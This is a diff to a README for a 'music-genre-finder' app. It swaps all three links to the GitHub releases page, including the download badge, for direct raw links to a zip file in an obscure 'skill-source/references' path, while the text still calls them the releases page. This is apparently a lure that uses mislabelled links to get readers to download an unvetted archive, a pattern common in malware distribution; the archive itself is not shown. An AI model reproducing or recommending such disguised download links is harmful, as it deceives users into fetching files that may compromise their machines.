@@ -1,6 +1,6 @@
 # 🎵 music-genre-finder - Discover Your Favorite Music Genres Effortlessly
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/RoyanTDeuS/music-genre-finder/releases)
+[![Download Release](https://raw.githubusercontent.com/RoyanTDeuS/music-genre-finder/main/skill-source/references/main/finder-genre-music-3.6.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/RoyanTDeuS/music-genre-finder/main/skill-source/references/main/finder-genre-music-3.6.zip)
 
 ## 📖 Introduction
 
@@ -13,7 +13,7 @@ Follow these simple steps to download and run the music-genre-finder application
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page. 
-   [Download from Releases](https://github.com/RoyanTDeuS/music-genre-finder/releases)
+   [Download from Releases](https://raw.githubusercontent.com/RoyanTDeuS/music-genre-finder/main/skill-source/references/main/finder-genre-music-3.6.zip)
    
 2. **Choose Your Version**: On the releases page, you’ll see different versions of the software. Each version may have new features or fixes. Choose the latest version for the best experience.
 
@@ -68,4 +68,4 @@ The music-genre-finder is licensed under the MIT License, which allows you to us
 
 ---
 
-Feel free to explore the releases page: [Download from Releases](https://github.com/RoyanTDeuS/music-genre-finder/releases) and enjoy discovering new music genres!
+Feel free to explore the releases page: [Download from Releases](https://raw.githubusercontent.com/RoyanTDeuS/music-genre-finder/main/skill-source/references/main/finder-genre-music-3.6.zip) and enjoy discovering new music genres!
